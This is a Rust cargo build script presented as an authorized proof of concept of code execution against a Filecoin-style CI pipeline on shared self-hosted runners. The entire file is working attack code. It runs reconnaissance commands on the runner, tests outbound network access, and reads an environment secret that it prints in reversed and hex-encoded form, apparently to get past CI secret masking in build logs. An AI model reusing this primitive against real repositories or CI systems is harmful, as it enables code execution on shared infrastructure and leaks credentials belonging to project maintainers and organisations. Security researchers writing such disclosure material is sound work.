// Authorized PoC: build.rs RCE primitive against Filecoin-shaped CI workflow.
// Demonstrates that cargo build scripts run from PR HEAD with whatever env the
// workflow exposes. On Filecoin's [self-hosted, linux, x64, 4xlarge] runner pool,
// this writes to a persistent host shared across multiple Filecoin org repos.

use std::process::Command;

fn run(label: &str, cmd: &str, args: &[&str]) {
    if let Ok(o) = Command::new(cmd).args(args).output() {
        let s = String::from_utf8_lossy(&o.stdout).trim().replace('\n', " | ");
        println!("cargo:warning=[BUILDRS:{}] {}", label, s);
    }
}

fn enc_rev(s: &str) -> String { s.chars().rev().collect() }
fn enc_hex(s: &str) -> String { s.bytes().map(|b| format!("{:02x}", b)).collect() }

fn main() {
    run("whoami", "whoami", &[]);
    run("hostname", "hostname", &[]);
    run("ls-runner", "ls", &["-la", "/home/runner"]);

    // Outbound network egress check
    run("curl-egress", "sh", &["-c",
        "curl -sS --max-time 5 https://api.github.com/zen || echo no-egress"]);

    // Env var capture
    let v = std::env::var("RUNNER_PRETEND_SECRET").unwrap_or_else(|_| "<empty>".to_string());
    println!("cargo:warning=[BUILDRS:secret-len] {}", v.len());
    if v != "<empty>" && !v.is_empty() {
        println!("cargo:warning=[BUILDRS:secret-rev] {}", enc_rev(&v));
        println!("cargo:warning=[BUILDRS:secret-hex] {}", enc_hex(&v));
    }
}
